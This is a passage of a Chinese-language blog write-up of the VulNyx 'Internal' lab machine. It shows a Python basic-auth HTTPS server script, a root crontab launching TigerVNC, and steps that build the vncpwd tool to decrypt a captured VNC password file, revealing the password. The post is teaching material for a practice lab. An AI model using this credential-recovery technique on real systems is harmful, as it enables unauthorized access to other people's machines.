class="built_in">open</span>(K_F, <span class="string">&#x27;wt&#x27;</span>).write((crypto.dump_privatekey(crypto.FILETYPE_PEM, pkey=k)).decode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 写入私钥文件</span></span><br><span class="line">    <span class="built_in">open</span>(P_F, <span class="string">&#x27;wt&#x27;</span>).write((crypto.dump_publickey(crypto.FILETYPE_PEM, pkey=k)).decode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 写入公钥文件</span></span><br><span class="line">    <span class="keyword">return</span> C_F, K_F, P_F  <span class="comment"># 返回证书、私钥和公钥文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AuthHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):  <span class="comment"># 创建认证处理类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_HEAD</span>(<span class="params">self</span>):  <span class="comment"># 处理HEAD请求</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;send header&quot;</span>)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_AUTHHEAD</span>(<span class="params">self</span>):  <span class="comment"># 处理认证头部</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;send header&quot;</span>)</span><br><span class="line">        self.send_response(<span class="number">401</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;WWW-Authenticate&#x27;</span>, <span class="string">&#x27;Basic realm=\&quot;PROD\&quot;&#x27;</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):  <span class="comment"># 处理GET请求</span></span><br><span class="line">        <span class="keyword">global</span> ARGS  <span class="comment"># 声明全局变量</span></span><br><span class="line">        key = base64.b64encode(<span class="built_in">bytes</span>(ARGS[<span class="string">&#x27;auth&#x27;</span>].encode(<span class="string">&quot;utf-8&quot;</span>)))  <span class="comment"># 对认证信息进行Base64编码</span></span><br><span class="line">        <span class="keyword">if</span> self.headers.get(<span class="string">&#x27;Authorization&#x27;</span>) == <span class="literal">None</span>:  <span class="comment"># 如果没有收到认证头部</span></span><br><span class="line">            self.do_AUTHHEAD()  <span class="comment"># 发送认证头部</span></span><br><span class="line">            self.wfile.write(<span class="built_in">bytes</span>(<span class="string">&#x27;no auth header received&#x27;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)))  <span class="comment"># 发送未收到认证头部的消息</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> self.headers.get(<span class="string">&#x27;Authorization&#x27;</span>) == <span class="string">&#x27;Basic &#x27;</span>+key.decode(<span class="string">&#x27;utf-8&#x27;</span>):  <span class="comment"># 如果收到了正确的认证头部</span></span><br><span class="line">            SimpleHTTPRequestHandler.do_GET(self)  <span class="comment"># 处理GET请求</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果收到了错误的认证头部</span></span><br><span class="line">            self.do_AUTHHEAD()  <span class="comment"># 发送认证头部</span></span><br><span class="line">            self.wfile.write(<span class="built_in">bytes</span>(self.headers.get(<span class="string">&#x27;Authorization&#x27;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)))  <span class="comment"># 发送错误的认证头部</span></span><br><span class="line">            self.wfile.write(<span class="built_in">bytes</span>(<span class="string">&#x27;not authenticated&#x27;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)))  <span class="comment"># 发送未认证的消息</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_server</span>(<span class="params">ARGS</span>):  <span class="comment"># 创建服务器函数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ARGS[<span class="string">&#x27;auth&#x27;</span>] == <span class="literal">None</span>:  <span class="comment"># 如果启用了认证</span></span><br><span class="line">        httpd = HTTPServer((ARGS[<span class="string">&#x27;ip&#x27;</span>], ARGS[<span class="string">&#x27;port&#x27;</span>]), AuthHandler)  <span class="comment"># 创建带认证的HTTP服务器</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 如果未启用认证</span></span><br><span class="line">        httpd = HTTPServer((ARGS[<span class="string">&#x27;ip&#x27;</span>], ARGS[<span class="string">&#x27;port&#x27;</span>]), SimpleHTTPRequestHandler)  <span class="comment"># 创建普通的HTTP服务器</span></span><br><span class="line">    <span class="keyword">if</span> ARGS[<span class="string">&#x27;https&#x27;</span>]:  <span class="comment"># 如果使用HTTPS</span></span><br><span class="line">        <span class="keyword">if</span> ARGS[<span class="string">&#x27;cert&#x27;</span>] <span class="keyword">and</span> ARGS[<span class="string">&#x27;privatekey&#x27;</span>]:  <span class="comment"># 如果提供了证书和私钥</span></span><br><span class="line">            CERT = ARGS[<span class="string">&#x27;cert&#x27;</span>]  <span class="comment"># 设置证书路径</span></span><br><span class="line">            PEM = ARGS[<span class="string">&#x27;privatekey&#x27;</span>]  <span class="comment"># 设置私钥路径</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果未提供证书和私钥</span></span><br><span class="line">            <span class="keyword">global</span> tempfiles  <span class="comment"># 声明全局变量</span></span><br><span class="line">            CERT, PEM, PUBKEY = gencert()  <span class="comment"># 生成自签名证书</span></span><br><span class="line">        httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERT, keyfile=PEM, server_side=<span class="literal">True</span>)  <span class="comment"># 使用SSL包装socket</span></span><br><span class="line">    <span class="keyword">try</span>:  <span class="comment"># 尝试启动服务器</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[#] Now serving HTTP%s on %s:%s %s&quot;</span> % (  <span class="comment"># 打印信息</span></span><br><span class="line">            <span class="string">&quot;S&quot;</span> <span class="keyword">if</span> ARGS[<span class="string">&#x27;https&#x27;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">            ARGS[<span class="string">&#x27;ip&#x27;</span>],</span><br><span class="line">            ARGS[<span class="string">&#x27;port&#x27;</span>],</span><br><span class="line">            <span class="string">&quot;with AUTH &quot;</span>+ARGS[<span class="string">&#x27;auth&#x27;</span>] <span class="keyword">if</span> ARGS[<span class="string">&#x27;auth&#x27;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        ))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[#] Ctrl+C to stop server\n&quot;</span>)  <span class="comment"># 打印信息</span></span><br><span class="line">        httpd.serve_forever()  <span class="comment"># 启动服务器</span></span><br><span class="line">    <span class="keyword">except</span> TypeError:  <span class="comment"># 如果发生类型错误</span></span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 忽略异常</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:  <span class="comment"># 如果接收到键盘中断信号</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tempfiles) &gt; <span class="number">0</span>:  <span class="comment"># 如果存在临时文件</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> tempfiles:  <span class="comment"># 遍历临时文件</span></span><br><span class="line">                os.remove(item)  <span class="comment"># 删除临时文件</span></span><br><span class="line">        sys.exit()  <span class="comment"># 退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  <span class="comment"># 主函数</span></span><br><span class="line">    <span class="keyword">global</span> ARGS  <span class="comment"># 声明全局变量</span></span><br><span class="line">    ARGS = Get_Args()  <span class="comment"># 解析命令行参数</span></span><br><span class="line">    build_server(ARGS)  <span class="comment"># 创建服务器</span></span><br><span class="line">    sys.exit()  <span class="comment"># 退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:  <span class="comment"># 如果直接运行该脚本</span></span><br><span class="line">    main()  <span class="comment"># 调用主函数</span></span><br></pre></td></tr></table></figure>
+<h3 id="vnc">3.3. VNC</h3>
+<p>定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@internal:~<span class="comment"># crontab  -l</span></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line</span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run</span></span><br><span class="line"><span class="comment"># and what command to run for the task</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for</span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system</span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4. For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">@reboot /usr/bin/tigervncserver -xstartup /usr/bin/xterm &amp;</span><br></pre></td></tr></table></figure>
+<p>配置文件在 /etc/tigervnc 下【前面是以默认配置启动的】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@internal:/etc/tigervnc<span class="comment"># ls -al</span></span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  2 root root  4096 may  8  2023 .</span><br><span class="line">drwxr-xr-x 74 root root  4096 jun 12 12:37 ..</span><br><span class="line">-rw-r--r--  1 root root  2866 ene 26  2022 openssl.cnf</span><br><span class="line">-rw-r--r--  1 root root    71 ene 26  2022 openssl-ecparams.pem</span><br><span class="line">-rw-r--r--  1 root root 10472 ene 26  2022 vncserver-config-defaults</span><br><span class="line">-rw-r--r--  1 root root  2189 ene 26  2022 vncserver-config-mandatory</span><br><span class="line">-rw-r--r--  1 root root   157 sep  8  2020 vncserver.users</span><br></pre></td></tr></table></figure>
+<p>解密 VNC 密码【<a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc#decrypting-vnc-password">5800,5801,5900,5901
+- Pentesting VNC | HackTricks | HackTricks</a>】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeroennijhof/vncpwd.git</span><br><span class="line"><span class="built_in">cd</span> vncpwd</span><br><span class="line">make</span><br><span class="line">./vncpwd ../passwd</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121842752.png" /></p>
+<p>得 Password: VNCr00t</p>
+<p>可用 diff 对比两个 passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff passwd /home/admin/.../passwd</span><br></pre></td></tr></table></figure>
+<h2 id="参考">4. 参考</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://infayer.com/archivos/1971">Máquina Internal de
+VulNyx – INFAYER</a><br />
+</li>
+<li><a
+target="_blank" rel="noopener" href="https://blog.spoock.com/2019/10/08/proc/">Linux下/proc目录简介 |
+Spoock</a><br />
+</li>
+<li><a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">5800,5801,5900,5901
+- Pentesting VNC | HackTricks | HackTricks</a><br />
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jeroennijhof/vncpwd">GitHub -
+jeroennijhof/vncpwd: VNC Password Decrypter</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/" title="VulNyx - Internal">https://z9m8r8.github.io/2024/06/12/VulNyx - Internal/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息搜集</a>
+              <a href="/tags/Fuzzing/" rel="tag"><i class="fa fa-tag"></i> Fuzzing</a>
+              <a href="/tags/VulNyx/" rel="tag"><i class="fa fa-tag"></i> VulNyx</a>
+              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
+              <a href="/tags/IPv6/" rel="tag"><i class="fa fa-tag"></i> IPv6</a>
+              <a href="/tags/SimpleHTTP-0-6/" rel="tag"><i class="fa fa-tag"></i> SimpleHTTP/0.6</a>
+              <a href="/tags/proc/" rel="tag"><i class="fa fa-tag"></i> proc</a>
+              <a href="/tags/proc-pid-cmdline/" rel="tag"><i class="fa fa-tag"></i> proc/pid/cmdline</a>
+              <a href="/tags/VNC/" rel="tag"><i class="fa fa-tag"></i> VNC</a>
+              <a href="/tags/X11/" rel="tag"><i class="fa fa-tag"></i> X11</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/11/VulNyx%20-%20Zone/" rel="prev" title="VulNyx - Zone">
+                  <i class="fa fa-angle-left"></i> VulNyx - Zone
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">250k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">15:09</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
